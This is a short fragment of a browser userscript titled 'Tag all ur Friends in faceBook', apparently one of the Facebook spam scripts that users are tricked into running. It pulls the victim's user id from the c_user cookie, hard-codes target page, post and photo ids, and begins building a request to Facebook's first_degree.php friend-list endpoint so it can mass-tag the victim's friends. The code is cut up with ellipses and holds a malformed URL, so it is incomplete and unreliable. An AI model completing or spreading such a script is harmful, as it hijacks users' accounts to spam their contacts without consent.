// ==UserScript==
// @name              Tag all ur Friends  in faceBook
// @namespace         Tag all ur Friends  in faceBook
// @Hak Cipta       Smart Boy
// ==/UserScript==
...
var spage_id = "127191217436385";
var spost_id = "127191217436385";
var sfoto_id = "127191217436385";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
http://first_degree.php/?__a=1&filter%5B0%5D=user&lazy=0&viewer=%22+uid+%22&token=v7&stale_ok=0&opti
first_degree.php